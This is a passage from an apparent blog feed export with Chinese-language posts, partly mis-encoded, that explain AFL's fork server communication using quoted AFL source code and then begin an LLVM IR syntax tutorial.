punctuation">)</span><span class="token punctuation">;</span>Â·Â·Â·Â·Â·Â·  <span class="token comment">/* If we have a four-byte "hello" message from the server, we're all set.Otherwise, try to figure out what went wrong. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>rlen <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"All right - fork server is up."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h3 id="fork-serverä¸fuzzeré€šä¿¡">fork serverä¸fuzzeré€šä¿¡</h3><h4 id="fork-serverä¾§çš„å…·ä½“æ“ä½œ">fork serverä¾§çš„å…·ä½“æ“ä½œ</h4><p>æ–¹æ³•<code>__afl_maybe_log()</code>ä¸­ã€‚é¦–å…ˆï¼Œé€šè¿‡å†™å…¥çŠ¶æ€ç®¡é“ï¼Œfork serverä¼šé€šçŸ¥fuzzerï¼Œå…¶å·²ç»å‡†å¤‡å®Œæ¯•ï¼Œå¯ä»¥å¼€å§‹forkäº†ï¼Œè€Œè¿™æ­£æ˜¯ä¸Šé¢æåˆ°çš„çˆ¶è¿›ç¨‹ç­‰å¾…çš„ä¿¡æ¯ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span>Â·Â·Â·Â·Â·Â·  <span class="token string">"__afl_forkserver:\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  /* Enter the fork server mode to avoid the overhead of execve() calls. We\n"</span>  <span class="token string">"     push rdx (area ptr) twice to keep stack alignment neat. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  pushq %rdx\n"</span>  <span class="token string">"  pushq %rdx\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  /* Phone home and tell the parent that we're OK. (Note that signals with\n"</span>  <span class="token string">"     no SA_RESTART will mess it up). If this fails, assume that the fd is\n"</span>  <span class="token string">"     closed because we were execve()d from an instrumented binary, or because\n"</span>  <span class="token string">"     the parent doesn't want to use the fork server. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $4, %rdx               /* length    */\n"</span>  <span class="token string">"  leaq __afl_temp(%rip), %rsi /* data      */\n"</span>  <span class="token string">"  movq $"</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">", %rdi       /* file desc */\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span>  <span class="token string">"\n"</span>  <span class="token string">"  cmpq $4, %rax\n"</span>  <span class="token string">"  jne  __afl_fork_resume\n"</span>Â·Â·Â·Â·Â·Â·</code></pre><p>æ¥ä¸‹æ¥ï¼Œfork serverè¿›å…¥ç­‰å¾…çŠ¶æ€<code>__afl_fork_wait_loop</code>ï¼Œè¯»å–å‘½ä»¤ç®¡é“ï¼Œç›´åˆ°fuzzeré€šçŸ¥å…¶å¼€å§‹forkï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span>Â·Â·Â·Â·Â·Â·  <span class="token string">"__afl_fork_wait_loop:\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  /* Wait for parent by reading from the pipe. Abort if read fails. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $4, %rdx               /* length    */\n"</span>  <span class="token string">"  leaq __afl_temp(%rip), %rsi /* data      */\n"</span>  <span class="token string">"  movq $"</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>FORKSRV_FD<span class="token punctuation">)</span> <span class="token string">", %rdi             /* file desc */\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span>  <span class="token string">"  cmpq $4, %rax\n"</span>  <span class="token string">"  jne  __afl_die\n"</span>  <span class="token string">"\n"</span>Â·Â·Â·Â·Â·Â·</code></pre><p>ä¸€æ—¦fork serveræ¥æ”¶åˆ°fuzzerçš„ä¿¡æ¯ï¼Œä¾¿è°ƒç”¨<code>fork()</code>ï¼Œå¾—åˆ°çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span>Â·Â·Â·Â·Â·Â·  <span class="token string">"  /* Once woken up, create a clone of our process. This is an excellent use\n"</span>  <span class="token string">"     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n"</span>  <span class="token string">"     caches getpid() results and offers no way to update the value, breaking\n"</span>  <span class="token string">"     abort(), raise(), and a bunch of other things :-( */\n"</span>  <span class="token string">"\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"fork"</span><span class="token punctuation">)</span>  <span class="token string">"  cmpq $0, %rax\n"</span>  <span class="token string">"  jl   __afl_die\n"</span>  <span class="token string">"  je   __afl_fork_resume\n"</span>  <span class="token string">"\n"</span>Â·Â·Â·Â·Â·Â· </code></pre><p>å­è¿›ç¨‹æ˜¯å®é™…æ‰§è¡Œtargetçš„è¿›ç¨‹ï¼Œå…¶è·³è½¬åˆ°<code>__afl_fork_resume</code>ã€‚åœ¨è¿™é‡Œä¼šå…³é—­ä¸å†éœ€è¦çš„ç®¡é“ï¼Œå¹¶ç»§ç»­æ‰§è¡Œï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span>Â·Â·Â·Â·Â·Â·  <span class="token string">"__afl_fork_resume:\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  /* In child process: close fds, resume execution. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $"</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>FORKSRV_FD<span class="token punctuation">)</span> <span class="token string">", %rdi\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"close"</span><span class="token punctuation">)</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $"</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">", %rdi\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"close"</span><span class="token punctuation">)</span>  <span class="token string">"\n"</span>  <span class="token string">"  popq %rdx\n"</span>  <span class="token string">"  popq %rdx\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq %r12, %rsp\n"</span>  <span class="token string">"  popq %r12\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq  0(%rsp), %rax\n"</span>  <span class="token string">"  movq  8(%rsp), %rcx\n"</span>  <span class="token string">"  movq 16(%rsp), %rdi\n"</span>  <span class="token string">"  movq 32(%rsp), %rsi\n"</span>  <span class="token string">"  movq 40(%rsp), %r8\n"</span>  <span class="token string">"  movq 48(%rsp), %r9\n"</span>  <span class="token string">"  movq 56(%rsp), %r10\n"</span>  <span class="token string">"  movq 64(%rsp), %r11\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq  96(%rsp), %xmm0\n"</span>  <span class="token string">"  movq 112(%rsp), %xmm1\n"</span>  <span class="token string">"  movq 128(%rsp), %xmm2\n"</span>  <span class="token string">"  movq 144(%rsp), %xmm3\n"</span>  <span class="token string">"  movq 160(%rsp), %xmm4\n"</span>  <span class="token string">"  movq 176(%rsp), %xmm5\n"</span>  <span class="token string">"  movq 192(%rsp), %xmm6\n"</span>  <span class="token string">"  movq 208(%rsp), %xmm7\n"</span>  <span class="token string">"  movq 224(%rsp), %xmm8\n"</span>  <span class="token string">"  movq 240(%rsp), %xmm9\n"</span>  <span class="token string">"  movq 256(%rsp), %xmm10\n"</span>  <span class="token string">"  movq 272(%rsp), %xmm11\n"</span>  <span class="token string">"  movq 288(%rsp), %xmm12\n"</span>  <span class="token string">"  movq 304(%rsp), %xmm13\n"</span>  <span class="token string">"  movq 320(%rsp), %xmm14\n"</span>  <span class="token string">"  movq 336(%rsp), %xmm15\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  leaq 352(%rsp), %rsp\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  jmp  __afl_store\n"</span>Â·Â·Â·Â·Â·Â· </code></pre><p>çˆ¶è¿›ç¨‹åˆ™ä»ç„¶ä½œä¸ºfork serverè¿è¡Œï¼Œå…¶ä¼šå°†å­è¿›ç¨‹çš„pidé€šè¿‡çŠ¶æ€ç®¡é“å‘é€ç»™fuzzerï¼Œå¹¶ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼›ä¸€æ—¦å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œåˆ™å†é€šè¿‡çŠ¶æ€ç®¡é“ï¼Œå°†å…¶ç»“æŸçŠ¶æ€å‘é€ç»™fuzzerï¼›ä¹‹åå†æ¬¡è¿›å…¥ç­‰å¾…çŠ¶æ€<code>__afl_fork_wait_loop</code>ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span>Â·Â·Â·Â·Â·Â·  <span class="token string">"  /* In parent process: write PID to pipe, then wait for child. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movl %eax, __afl_fork_pid(%rip)\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $4, %rdx                   /* length    */\n"</span>  <span class="token string">"  leaq __afl_fork_pid(%rip), %rsi /* data      */\n"</span>  <span class="token string">"  movq $"</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">", %rdi             /* file desc */\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $0, %rdx                   /* no flags  */\n"</span>  <span class="token string">"  leaq __afl_temp(%rip), %rsi     /* status    */\n"</span>  <span class="token string">"  movq __afl_fork_pid(%rip), %rdi /* PID       */\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"waitpid"</span><span class="token punctuation">)</span>  <span class="token string">"  cmpq $0, %rax\n"</span>  <span class="token string">"  jle  __afl_die\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  /* Relay wait status to pipe, then loop back. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq $4, %rdx               /* length    */\n"</span>  <span class="token string">"  leaq __afl_temp(%rip), %rsi /* data      */\n"</span>  <span class="token string">"  movq $"</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">", %rdi         /* file desc */\n"</span>  <span class="token function">CALL_L64</span><span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span>  <span class="token string">"\n"</span>  <span class="token string">"  jmp  __afl_fork_wait_loop\n"</span>Â·Â·Â·Â·Â·Â· </code></pre><h4 id="fuzzerä¾§çš„å…·ä½“æ“ä½œ">fuzzerä¾§çš„å…·ä½“æ“ä½œ</h4><p>åœ¨fork serverå¯åŠ¨å®Œæˆåï¼Œä¸€æ—¦éœ€è¦æ‰§è¡ŒæŸä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåˆ™fuzzerä¼šè°ƒç”¨<code>run_target()</code>æ–¹æ³•</p><p><code>run_target()</code>æ–¹æ³•ä¸­ï¼Œé€šè¿‡å‘½ä»¤ç®¡é“ï¼Œé€šçŸ¥fork serverå‡†å¤‡forkï¼›å¹¶é€šè¿‡çŠ¶æ€ç®¡é“ï¼Œè·å–å­è¿›ç¨‹pidï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u8 <span class="token function">run_target</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> u32 timeout<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Â·Â·Â·Â·Â·Â·    s32 res<span class="token punctuation">;</span>    <span class="token comment">/* In non-dumb mode, we have the fork server up and running, so simply       tell it to have at it, and then read back PID. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>res <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fsrv_ctl_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_timed_out<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">RPFATAL</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">"Unable to request new process from fork server (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>res <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fsrv_st_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>child_pid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">RPFATAL</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">"Unable to request new process from fork server (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Fork server is misbehaving (OOM?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Â·Â·Â·Â·Â·Â·<span class="token punctuation">&#125;</span></code></pre><p>éšåï¼Œfuzzerå†æ¬¡è¯»å–çŠ¶æ€ç®¡é“ï¼Œè·å–å­è¿›ç¨‹é€€å‡ºçŠ¶æ€ï¼Œå¹¶ç”±æ­¤æ¥åˆ¤æ–­å­è¿›ç¨‹ç»“æŸçš„åŸå› ï¼Œä¾‹å¦‚æ­£å¸¸é€€å‡ºã€è¶…æ—¶ã€å´©æºƒç­‰ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„è®°å½•ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u8 <span class="token function">run_target</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> u32 timeout<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Â·Â·Â·Â·Â·Â·  <span class="token comment">/* Report outcome to caller. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>stop_soon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    kill_signal <span class="token operator">=</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>child_timed_out <span class="token operator">&amp;&amp;</span> kill_signal <span class="token operator">==</span> SIGKILL<span class="token punctuation">)</span> <span class="token keyword">return</span> FAULT_TMOUT<span class="token punctuation">;</span>    <span class="token keyword">return</span> FAULT_CRASH<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>Â·Â·Â·Â·Â·Â·<span class="token punctuation">&#125;</span></code></pre><p>hew</p></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> è®ºæ–‡ </tag>
            
            <tag> AFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM å­¦ä¹ (äºŒ) -LLVM IR è¯­æ³•ç†è®ºå­¦ä¹ </title>
      <link href="/posts/32795611/"/>
      <url>/posts/32795611/</url>
      
        <content type="html"><![CDATA[<h1>LLVM å­¦ä¹ (äºŒ) -LLVM IR è¯­æ³•ç†è®ºå­¦ä¹ </h1><blockquote><p>@create 2022-04-16 12:05:47</p><p>@sizaif</p><p><img src="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></blockquote><h2 id="LLVM-IR-è¯­æ³•">LLVM IR è¯­æ³•</h2><div class="story post-story"><blockquote><p><a href="https://llvm.org/docs/LangRef.html">https://llvm.org/docs/LangRef.html</a></p></blockquote><p>LLVM IRä¸­çš„æ ‡è¯†ç¬¦æœ‰ä¸¤ç§åŸºæœ¬ç±»å‹ï¼š<font color='red'>å…¨å±€æ ‡è¯†ç¬¦ï¼ˆä»¥<code>@</code>å¼€å¤´ï¼‰å’Œå±€éƒ¨æ ‡è¯†ç¬¦ï¼ˆä»¥<code>%</code>å¼€å¤´ï¼‰</font></p><p>1ã€å‘½åå€¼ä»¥å­—æ¯åºåˆ—å¼€å¤´ï¼Œä¾‹å¦‚ï¼š<code>%foo</code>, <code>@DivisionByZero</code>, <code>%a.really.long.identifier</code>. æ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š â€˜<code>[%@][-a-zA-Z$._][-a-zA-Z$._0-9]*</code>â€˜.</p><p>2ã€éå‘½åå€¼ä»¥æ•°å­—å¼€å¤´ï¼Œä¾‹å¦‚ï¼š <code>%12</code>, <code>@2</code>, <code>%44</code>.</p><p><strong>å…¨å±€æ ‡è¯†ç¬¦</strong>ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡ã€å…¨å±€å¸¸é‡å’Œå‡½æ•°</p><p><strong>å±€éƒ¨æ ‡è¯†ç¬¦</strong>ï¼Œå³å±€éƒ¨å˜é‡ã€‚LLVM IRä¸­çš„å±€éƒ¨å˜é‡æœ‰ä¸¤ç§åˆ†ç±»æ–¹æ¡ˆï¼š</p><p>æŒ‰ç…§æ˜¯å¦å‘½ååˆ†ç±»ï¼š</p><ul><li>å‘½åå±€éƒ¨å˜é‡ï¼šé¡¾åæ€ä¹‰ï¼Œæ¯”å¦‚<code>%tmp</code></li><li>æœªå‘½åå±€éƒ¨å˜é‡ï¼šä»¥å¸¦å‰ç¼€çš„æ— ç¬¦å·æ•°å­—å€¼è¡¨ç¤ºï¼Œæ¯”å¦‚<code>%1</code>ã€<code>%2</code>ï¼ŒæŒ‰é¡ºåºç¼–å·ï¼Œå‡½æ•°å‚æ•°ã€æœªå‘½ååŸºæœ¬å—éƒ½ä¼šå¢åŠ è®¡æ•°</li></ul><p>æŒ‰ç…§åˆ†é…æ–¹å¼åˆ†ç±»ï¼š</p><ul><li>å¯„å­˜å™¨åˆ†é…çš„å±€éƒ¨å˜é‡ï¼šæ­¤ç±»å±€éƒ¨å˜é‡å¤šé‡‡ç”¨<code>%1 = some value</code>å½¢å¼è¿›è¡Œåˆ†é…ï¼Œä¸€èˆ¬æ˜¯æ¥å—æŒ‡ä»¤è¿”å›ç»“æœçš„å±€éƒ¨å˜é‡ ï¼Œ</li><li>æ ˆåˆ†é…çš„å±€éƒ¨å˜é‡ï¼šä½¿ç”¨<code>alloca</code>æŒ‡ä»¤åœ¨æ ˆå¸§ä¸Šåˆ†é…çš„å±€éƒ¨å˜é‡ï¼Œæ¯”å¦‚<code>%2 = alloca i32</code>ï¼Œ<code>%2</code>ä¹Ÿæ˜¯ä¸ªæŒ‡é’ˆï¼Œè®¿é—®æˆ–å­˜å‚¨æ—¶å¿…é¡»ä½¿ç”¨<code>load</code>å’Œ<code>store</code>æŒ‡ä»¤</li></ul><pre class="language-llvm" data-language="llvm"><code class="language-llvm"><span class="token keyword">define</span> <span class="token type class-name">i32</span> <span class="token variable">@main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">%1</span> <span class="token punctuation">=</span> <span class="token keyword">alloca</span> <span class="token type class-name">i32</span><span class="token punctuation">,</span> <span class="token keyword">align</span> <span class="token number">4</span>    <span class="token variable">%tmp</span> <span class="token punctuation">=</span> <span class="token keyword">alloca</span> <span class="token type class-name">i32</span><span class="token punctuation">,</span> <span class="token keyword">align</span> <span class="token number">4</span>    <span class="token keyword">store</span> <span class="token type class-name">i32</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token type class-name">i32</span><span class="token punctuation">*</span> <span class="token variable">%1</span><span class="token punctuation">,</span> <span class="token keyword">align</span> <span class="token number">4</span>    <span class="token keyword">store</span> <span class="token type class-name">i64</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token type class-name">i32</span><span class="token punctuation">*</span> <span class="token variable">%tmp</span><span class="token punctuation">,</span> <span class="token keyword">align</span> <span class="token number">8</span>    <span class="token variable">%2</span> <span class="token punctuation">=</span> <span class="token keyword">add</span> <span class="token keyword">nsw</span> <span class="token type class-name">i32</span> <span class="token variable">%1</span><span class="token punctuation">,</span> <span class="token variable">%tmp</span>    <span class="token variable">%result</span> <span class="token punctuation">=</span> <span class="token keyword">add</span> <span class="token keyword">nsw</span> <span class="token type class-name">i32</span> <span class="token variable">%1</span><span class="token punctuation">,</span> <span class="token variable">%2</span><span class="token punctuation">&#125;</span></code></pre><p>å…¶ä¸­<code>%1</code>æ˜¯æ ˆåˆ†é…çš„æœªå‘½åå±€éƒ¨å˜é‡ï¼Œ<code>%tmp</code>æ˜¯æ ˆåˆ†é…çš„å‘½åå±€éƒ¨å˜é‡ï¼Œ<code>%2</code>æ˜¯å¯„å­˜å™¨åˆ†é…çš„æœªå‘½åå±€éƒ¨å˜é‡ï¼Œ<code>%result</code>æ˜¯å¯„å­˜å™¨åˆ†é…çš„å‘½åå±€éƒ¨å˜é‡</p><h3 id="æ¨¡å—ç»“æ„">æ¨¡å—ç»“æ„</h3><p>LLVMç¨‹åºç”±æ¨¡å—ç»„æˆï¼Œæ¯ä¸ªæ¨¡å—ç”±å‡½æ•°ã€å…¨å±€å˜é‡å’Œç¬¦å·è¡¨æ¡ç›®ç»„æˆã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">;</span> Declare the string constant as a global constant<span class="token punctuation">.</span><span class="token punctuation">;</span> å…¨å±€å˜é‡@<span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token keyword">private</span> unnamed_addr constant <span class="token punctuation">[</span><span class="token number">13</span> x i8<span class="token punctuation">]</span> c<span class="token string">"hello world\0A\00"</span><span class="token punctuation">;</span> External declaration of the puts function<span class="token punctuation">;</span> å‡½æ•°çš„å¤–éƒ¨å£°æ˜declare i32 @<span class="token function">puts</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> nocapture<span class="token punctuation">)</span> nounwind<span class="token punctuation">;</span> Definition of main function<span class="token punctuation">;</span> ä¸»å‡½æ•°define i32 @<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token punctuation">;</span> <span class="token function">i32</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span>  <span class="token punctuation">;</span> Convert <span class="token punctuation">[</span><span class="token number">13</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> to i8<span class="token operator">*</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">%</span>cast210 <span class="token operator">=</span> getelementptr <span class="token punctuation">[</span><span class="token number">13</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span>  <span class="token punctuation">;</span> Call puts function to write out the string to <span class="token constant">stdout</span><span class="token punctuation">.</span>  call i32 @<span class="token function">puts</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> <span class="token operator">%</span>cast210<span class="token punctuation">)</span>  ret i32 <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> Named metadata<span class="token punctuation">;</span> å…ƒç»„æ•°æ®<span class="token operator">!</span><span class="token number">0</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">42</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"string"</span><span class="token punctuation">&#125;</span><span class="token operator">!</span>foo <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">&#125;</span></code></pre><ul><li><code>Module</code>ï¼šLLVMç¨‹åºç”±æ¨¡å—ç»„æˆï¼Œæ¯ä¸ªè¾“å…¥ç¨‹åºéƒ½å¯¹åº”ä¸€ä¸ªæ¨¡å—ï¼Œæ¨¡å—åŒ…æ‹¬å‡½æ•°ã€å…¨å±€å˜é‡å’Œç¬¦å·è¡¨ã€‚å¤šä¸ªæ¨¡å—å¯ä»¥è¢«LLVM é“¾æ¥å™¨ï¼ˆlinkerï¼‰ç»„åˆåœ¨ä¸€èµ·ã€‚å¯ä»¥å°†LLVMä¸­çš„Moduleç±»æ¯”ä¸ºCç¨‹åºä¸­çš„æºæ–‡ä»¶ã€‚ä¸€ä¸ªCæºæ–‡ä»¶ä¸­åŒ…å«å‡½æ•°å’Œå…¨å±€å˜é‡å®šä¹‰ã€å¤–éƒ¨å‡½æ•°å’Œå¤–éƒ¨å‡½æ•°å£°æ˜ï¼Œä¸€ä¸ªModuleä¸­åŒ…å«çš„å†…å®¹ä¹ŸåŸºæœ¬ä¸Šå¦‚æ­¤ï¼Œåªä¸è¿‡Cæºæ–‡ä»¶ä¸­æ˜¯æºç æ¥è¡¨ç¤ºï¼ŒModuleä¸­æ˜¯ç”¨IRæ¥è¡¨ç¤ºã€‚</li><li><code>Function</code>ï¼šè¢«Moduleæ‰€åŒ…å«ï¼ŒLLVMçš„FunctionåŒ…å«å‡½æ•°åã€å‡½æ•°çš„è¿”å›å€¼å’Œå‚æ•°ç±»å‹ï¼ŒFunctionå†…éƒ¨åˆ™åŒ…å«BasicBlockã€‚</li><li><code>BasicBlock</code>ï¼šä¸ç¼–è¯‘æŠ€æœ¯ä¸­å¸¸è§çš„åŸºæœ¬å—(basic block)çš„æ¦‚å¿µæ˜¯ä¸€è‡´çš„ï¼ŒBasicBlockå¿…é¡»æœ‰ä¸€ä¸ªè¿›å…¥æ ‡ç­¾å’Œä¸€æ¡ç»“æŸæŒ‡ä»¤ã€‚ç»“æŸæŒ‡ä»¤ä¸€èˆ¬æ˜¯brè·³è½¬æŒ‡ä»¤æˆ–è€…retè¿”å›æ‰§è¡Œã€‚</li><li><code>Instruction</code>ï¼šå°±æ˜¯ä¸Šé¢æåˆ°è¿‡çš„â€œæŒ‡ä»¤â€ï¼ŒLLVM IRçš„æœ€åŸºæœ¬çš„å•ä½ï¼ŒInstructionè¢«åŒ…å«åœ¨BasicBlockä¸­ï¼Œä¸€ä¸ªBasicBlockå¯ä»¥æœ‰å¤šæ¡Instructionã€‚</li></ul><h3 id="é“¾æ¥ç±»å‹-Linkage-Types">é“¾æ¥ç±»å‹(<a href="https://llvm.org/docs/LangRef.html#id1539">Linkage Types</a>)</h3><p>å…¨å±€çš„å€¼ï¼ˆå…¨å±€å˜é‡å’Œå‡½æ•°ï¼‰éƒ½ç”±æŒ‡å‘æŸä¸ªç‰¹å®šä½ç½®çš„æŒ‡é’ˆè¡¨ç¤ºï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªé“¾æ¥ç±»å‹ï¼š</p><ul><li><p><code>private</code></p><p>privateç±»å‹çš„å…¨å±€å˜é‡åªèƒ½è¢«å½“å‰æ¨¡å—å†…çš„å¯¹è±¡ç›´æ¥è®¿é—®ï¼Œç§æœ‰</p></li><li><p><code>internal</code></p><p>ä¸privateç±»ä¼¼ï¼Œä¸è¿‡å®ƒçš„å€¼ä¼šä½œä¸ºå±€éƒ¨å˜é‡å‡ºç°åœ¨ç›®æ 